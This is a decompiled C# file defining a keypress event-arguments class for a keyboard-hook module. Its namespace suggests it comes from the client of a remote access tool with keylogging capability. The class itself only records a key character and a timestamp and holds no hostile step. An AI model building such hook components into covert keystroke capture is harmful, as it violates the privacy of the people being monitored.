using System;
using System.Collections.Generic;
using System.Windows.Forms;
using xClient.Core.MouseKeyHook.WinApi;

namespace xClient.Core.MouseKeyHook
{
	// Token: 0x02000069 RID: 105
	public class KeyPressEventArgsExt : KeyPressEventArgs
	{
		// Token: 0x060002DA RID: 730 RVA: 0x00003590 File Offset: 0x00001790
		internal KeyPressEventArgsExt(char keyChar, int timestamp) : base(keyChar)
		{
			this.IsNonChar = (keyChar == '\0');
			this.Timestamp = timestamp;
		}

		// Token: 0x060002DB RID: 731 RVA: 0x000035AA File Offset: 0x000017AA
		public KeyPressEventArgsExt(char keyChar) : this(keyChar, Environment.TickCount)
		{
		}

		// Token: 0x1700005A RID: 90
		// (get) Token: 0x060002DC RID: 732 RVA: 0x000035B8 File Offset: 0x000017B8
		// (set) Token: 0x060002DD RID: 733 RVA: 0x000035C0 File Offset: 0x000017C0
		public bool IsNonChar { get; private set; }

		// Token: 0x1700005B RID: 91
		// (get) Token: 0x060002DE RID: 734 RVA: 0x000035C9 File Offset: 0x000017C9
		// (set) Token: 0x060002DF RID: 735 RVA: 0x000035D1 File Offset: 0x000017D1
		public int Timestamp { get; private set; }

		// Token: 0x060002E0 RID: 736 RVA: 0x0000EADC File Offset: 0x0000CCDC
		internal static IEnumerable<KeyPressEventArgsExt> FromRawDataApp(CallbackData data)
		{
			KeyPressEventArgsExt.<FromRawDataApp>d__0 <FromRawDataApp>d__ = new KeyPressEventArgsExt.<FromRawDataApp>d__0(-2);
			<FromRawDataApp>d__.<>3__data = data;
			return <FromRawDataApp>d__;
		}

		// Token: 0x060002E1 RID: 737 RVA: 0x0000EAFC File Offset: 0x0000CCFC
		internal static IEnumerable<KeyPressEventArgsExt> FromRawDataGlobal(CallbackData data)
		{
			KeyPressEventArgsExt.<FromRawDataGlobal>d__f <FromRawDataGlobal>d__f = new KeyPressEventArgsExt.<FromRawDataGlobal>d__f(-2);
			<FromRawDataGlobal>d__f.<>3__data = data;
			return <FromRawDataGlobal>d__f;
		}
	}
}
